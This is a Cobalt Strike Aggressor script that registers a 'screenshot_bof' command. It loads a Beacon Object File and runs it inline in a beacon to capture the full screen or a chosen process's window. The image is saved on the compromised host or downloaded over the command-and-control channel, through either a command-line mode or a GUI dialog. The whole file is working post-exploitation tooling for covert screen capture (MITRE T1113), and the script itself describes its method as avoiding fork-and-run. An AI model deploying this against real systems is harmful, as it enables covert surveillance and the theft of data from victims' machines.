# Register command
beacon_command_register(
    "screenshot_bof",
    "Alternative screenshot capability that does not do fork n run",
    "Use: screenshot_bof [filename] [save method] [PID] [grayscale(0/1)=0] [quality 0-100=90] [scale%=100]\n- PID 0 captures full screen\n- Save methods: 0 drop to disk, 1 download file, 2 download screenshot\n- Grayscale/quality/scale optional; defaults applied when omitted\n- Scale is percent of original (e.g., 50 = half size)\n\nTake a screenshot inline using a BOF. Screenshot is saved as JPEG on disk or downloaded over beacon."
);

sub execute_screenshot {
    local('$bid $filename $method $pid $grayscale $quality $scale $handle $data $args $barch');
    ($bid, $filename, $method, $pid, $grayscale, $quality, $scale) = @_;

    if ($bid is $null) {
        show_message("Error: No Beacon ID found. Please run this command from a Beacon console.");
        return;
    }

    $barch = barch($bid);

    # read in the right BOF file
    $handle = openf(script_resource("ScreenshotBOF. $+ $barch $+ .obj"));
    if (isnull($handle)) {
        berror($bid, "Error: Could not find ScreenshotBOF. $+ $barch $+ .obj in script resource path.");
        return;
    }
    $data = readb($handle, -1);
    closef($handle);

    $args = bof_pack($bid, "ziiiii", $filename, int($method), int($pid), int($grayscale), int($quality), int($scale));

    btask($bid, "Running screenshot BOF by (@codex_tf2)", "T1113");
    beacon_inline_execute($bid, $data, "go", $args);
}

alias screenshot_bof {
    local('$bid');
    $bid = $1;

    # CASE 1: Arguments provided (CLI Mode)
    if (size(@_) > 1) {
        if (size(@_) < 4 || size(@_) > 7) {
            berror($bid, "Syntax: screenshot_bof [filename] [save method 0/1/2] [PID] [grayscale(0/1)=0] [quality 0-100=90] [scale%=100]");
            return;
        }
        local('$filename $method $pid $grayscale $quality $scale');
        $filename   = $2;
        $method     = $3;
        $pid        = $4;
        $grayscale  = iff(size(@_) >= 5, $5, 0);
        $quality    = iff(size(@_) >= 6, $6, 90);
        $scale      = iff(size(@_) >= 7, $7, 100);

        execute_screenshot($bid, $filename, $method, $pid, $grayscale, $quality, $scale);
    }
    # CASE 2: No arguments provided (GUI Mode)
    else {
        if ($bid is $null) {
            show_message("Error: You must run this command from inside a Beacon's console.");
            return;
        }

        local('$dialog %defaults');
        
        # Define the human-readable options
        # I added the numbers in parens so you know what they map to if you switch back to CLI
        local('@options');
        @options = @("Write to disk (0)", "Download as file (1)", "Download as screenshot (2)");

        %defaults["filename"]  = "image.jpeg";
        %defaults["method"]    = "Download as screenshot (2)"; # Set default text
        %defaults["pid"]       = "0";
        %defaults["grayscale"] = "false"; 
        %defaults["quality"]   = "90";
        %defaults["scale"]     = "100";
        %defaults["_bid"]      = $bid;

        $dialog = dialog("Screenshot BOF Config", %defaults, lambda({
            local('$filename $method_str $method_int $pid $grayscale $quality $scale $target_bid');
            
            $target_bid = $3["_bid"];
            $filename   = $3["filename"];
            $method_str = $3["method"];
            $pid        = $3["pid"];
            $quality    = $3["quality"];
            $scale      = $3["scale"];
            $grayscale  = iff($3["grayscale"] eq "true", 1, 0);

            # Map the text selection back to the integer the BOF needs
            if ($method_str eq "Write to disk (0)") {
                $method_int = 0;
            }
            else if ($method_str eq "Download as file (1)") {
                $method_int = 1;
            }
            else {
                $method_int = 2; # Default to screenshot view
            }

            execute_screenshot($target_bid, $filename, $method_int, $pid, $grayscale, $quality, $scale);
        }));

        dialog_description($dialog, "Configure the screenshot parameters. Leave PID as 0 for full screen.");
        
        drow_text($dialog, "filename", "Filename:");
        drow_combobox($dialog, "method", "Save Method:", @options);
        drow_text($dialog, "pid", "PID (0=Full Screen):");
        drow_checkbox($dialog, "grayscale", "Grayscale");
        drow_text($dialog, "quality", "Quality (0-100):");
        drow_text($dialog, "scale", "Scale %:");
        
        dbutton_action($dialog, "Execute");
        dialog_show($dialog);
    }
}